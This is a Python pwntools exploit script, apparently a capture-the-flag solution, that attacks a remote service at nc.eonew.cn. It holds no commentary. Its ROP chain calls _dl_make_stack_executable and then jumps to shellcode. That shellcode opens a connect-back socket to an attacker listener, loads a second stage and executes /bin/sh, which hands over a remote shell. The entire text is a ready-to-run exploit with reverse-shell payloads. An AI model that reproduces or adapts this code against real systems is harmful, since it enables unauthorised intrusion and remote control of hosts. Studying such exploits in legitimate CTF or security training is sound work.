from pwn import *

context.arch = 'amd64'

###Addr
__stack_prot = 0x6b8ef0
_libc_stack_end = 0x6b8ab0
_dl_make_stack_executable = 0x47f780

###ROPgadget
mov_rbpval_dh = 0x48dba8    # adc byte ptr [rbp + 0x13], dh ; xor eax, eax ; ret
pop_rdi = 0x400686
pop_rdx = 0x4492f5
jmp_rsp = 0x494087

###Exploit
r = remote('nc.eonew.cn',10003)
l = listen(10101)

arguments = p16(2)+p16(10101,endian='big')+p32(0x251e708c)+p64(0)
fake_rbp = p64(__stack_prot-0x13)
ROPchain = p64(pop_rdx)+p64(0x600)+\
           p64(mov_rbpval_dh)+\
           p64(pop_rdi)+p64(_libc_stack_end)+\
           p64(_dl_make_stack_executable)+\
           p64(jmp_rsp)
shellcode = asm('''
                push 2
                pop rdi
                push 1
                pop rsi
                xor edx,edx
                push 0x29
                pop rax
                syscall

                push rax
                pop rdi
                push rsp
                pop rsi
                sub rsi,0x50
                push 0x10
                pop rdx
                push 0x2a
                pop rax
                syscall

                push 0x200
                pop rdx
                xor rax, rax
                syscall
                ''')
payload = (arguments+fake_rbp+ROPchain+shellcode).ljust(0x80,b'\x90')
r.send(payload)

l.wait_for_connection()

argument = b'/bin/sh\x00'
padding = b'\x90'*0x78
shellcode = asm('''
                mov rdi,0
                mov rsi,1
                mov rax,0x21
                syscall

                mov rdi,rsp
                sub rdi,0x50
                mov rsi,0
                mov rdx,0
                mov rax,0x3b
                syscall
                ''')
payload = argument+padding+shellcode
l.send(payload)

l.interactive()
